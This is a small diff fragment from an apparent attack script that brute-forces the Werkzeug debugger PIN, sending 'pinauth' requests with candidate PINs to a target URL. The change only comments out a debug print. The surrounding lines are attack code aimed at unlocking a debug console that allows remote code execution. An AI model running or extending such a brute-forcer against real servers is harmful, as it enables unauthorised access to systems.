@@ -30,7 +30,7 @@ def main():
             r = requests.get(args.url, data={'s': args.secret, '__debugger__': 'yes', 'cmd': 'pinauth', 'pin': spin})
             # print('Request URL: ', r.url) # test
             print('\tStatus code: \t\t', r.status_code, '\n\tContent length: \t\t', len(r.content))
-            print('\tContent:\n', r.content, end='\n--------------------\n')
+            # print('\tContent:\n', r.content, end='\n--------------------\n')
             # exit()
         except:
             print("Connexion reset by peer, retry pin manually: ", pin, spin)
